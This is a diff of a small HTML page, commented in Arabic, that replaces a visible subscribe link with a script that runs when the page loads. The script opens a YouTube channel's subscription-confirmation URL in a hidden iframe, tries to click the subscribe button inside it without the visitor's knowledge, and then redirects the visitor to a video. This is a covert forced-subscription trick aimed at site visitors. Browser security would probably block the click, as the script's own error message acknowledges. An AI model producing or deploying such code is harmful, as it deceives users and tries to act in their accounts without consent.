@@ -1,27 +1,34 @@
+html
 <!DOCTYPE html>
 <html>
 <head>
     <title>Subscribe and Redirect</title>
 </head>
 <body>
-    <a id="subscribeLink" href="#">اضغط هنا للاشتراك في القناة</a>
-
     <script>
+        // اشتراك تلقائي في قناتك على YouTube
         var channelID = 'UC9m1E1BvZQDYSyADFkEHPgg'; // معرف القناة
         var subscribeURL = 'https://www.youtube.com/channel/' + channelID + '?sub_confirmation=1';
-        
-        document.getElementById('subscribeLink').addEventListener('click', function(event) {
-            event.preventDefault(); // منع السلوك الافتراضي للرابط
-            var hiddenIframe = document.createElement('iframe');
-            hiddenIframe.style.display = 'none';
-            hiddenIframe.src = subscribeURL;
-            document.body.appendChild(hiddenIframe);
+        var hiddenIframe = document.createElement('iframe');
+        hiddenIframe.style.display = 'none';
+        hiddenIframe.src = subscribeURL;
+        hiddenIframe.onload = function() {
+            try {
+                // محاولة النقر على زر الاشتراك داخل iframe
+                var subscribeButton = hiddenIframe.contentWindow.document.querySelector('paper-button#button');
+                if (subscribeButton) {
+                    subscribeButton.click();
+                }
+            } catch (e) {
+                console.log("لا يمكن التحكم في محتويات iframe بسبب سياسة الأمان.");
+            }
+        };
+        document.body.appendChild(hiddenIframe);
 
-            // تحويل المستخدم إلى الصفحة الجديدة بعد اشتراكه
-            setTimeout(function() {
-                window.location.href = 'https://youtu.be/LrA96G8SYA0?si=FQDmrcjAaMg9zKMa'; // رابط الصفحة الجديدة
-            }, 3000); // زمن التأخير بالمللي ثانية قبل التحويل
-        });
+        // تحويل المستخدم إلى الصفحة الجديدة بعد اشتراكه
+        setTimeout(function() {
+            window.location.href = 'https://youtu.be/LrA96G8SYA0?si=FQDmrcjAaMg9zKMa'; // رابط الصفحة الجديدة
+        }, 5000); // زمن التأخير بالمللي ثانية قبل التحويل
     </script>
 </body>
 </html>
